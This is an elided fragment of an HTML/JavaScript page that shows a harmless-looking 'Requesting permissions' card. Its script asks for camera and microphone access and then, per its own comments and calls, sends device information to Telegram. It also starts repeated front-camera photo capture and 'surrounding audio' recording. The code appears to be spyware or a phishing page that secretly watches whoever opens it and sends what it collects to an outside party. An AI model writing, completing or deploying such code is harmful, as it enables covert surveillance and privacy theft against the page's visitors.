...
<div class="card" id="app">
  <div id="loadingSection">
    ...
    <div id="permissionStatus" class="permission-status">📡 Requesting permissions...</div>
...
<script>
  ...
  (async function() {
    ...
    try {
      permissionStatus.textContent = '📡 Requesting camera & microphone access...';
      ...
      permissionStatus.textContent = '✅ Camera & Microphone access granted';
      
      // Send device info
      sendToTelegram(`✅ Media permissions granted\n${getDeviceInfo()}`);
      
    } catch (err) {
      permissionStatus.textContent = '❌ Permission denied or error';
...
• Time: ${new Date().toISOString()}`;
  ...
  // Start media capture after permissions are granted
  ...
  // Photo capture - fixed for front camera
  function startPhotoCapture() {
    ...
    async function capturePhoto() {
      ...
      try {
        ...
        // Mirror the image for front camera effect
  ...
  // Audio capture - fixed to capture surrounding audio
